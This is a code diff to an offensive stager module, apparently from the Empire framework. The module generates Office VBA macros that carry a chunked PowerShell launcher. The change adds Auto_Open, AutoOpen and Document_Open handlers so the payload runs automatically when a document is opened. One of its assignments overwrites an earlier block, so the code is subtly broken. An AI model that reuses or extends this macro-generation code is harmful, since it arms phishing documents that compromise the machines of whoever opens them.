@@ -9,7 +9,7 @@ class Stager:
 
             'Author': ['@enigma0x3', '@harmj0y'],
 
-            'Description': ('Generates an office macro for Empire.'),
+            'Description': ('Generates an office macro for Empire, compatible with office 97-2003, and 2007 file types.'),
 
             'Comments': [
                 'http://enigma0x3.wordpress.com/2014/01/11/using-a-powershell-payload-in-a-client-side-attack/'
@@ -74,11 +74,19 @@ class Stager:
             return ""
         else:
             chunks = list(helpers.chunks(launcher, 50))
-            payload = "\tSet str = \"" + str(chunks[0]) + "\"\n"
+            payload = "\tDim Str As String\n"
+            payload += "\tstr = \"" + str(chunks[0]) + "\"\n"
             for chunk in chunks[1:]:
                 payload += "\tstr = str + \"" + str(chunk) + "\"\n"
 
-            macro = "Sub Document_Open()\n"
+            macro = "Sub Auto_Open()\n"
+            macro += "\tDebugging\n"
+            macro += "End Sub\n\n"
+            macro = "Sub AutoOpen()\n"
+            macro += "\tDebugging\n"
+            macro += "End Sub\n\n"
+
+            macro += "Sub Document_Open()\n"
             macro += "\tDebugging\n"
             macro += "End Sub\n\n"
 
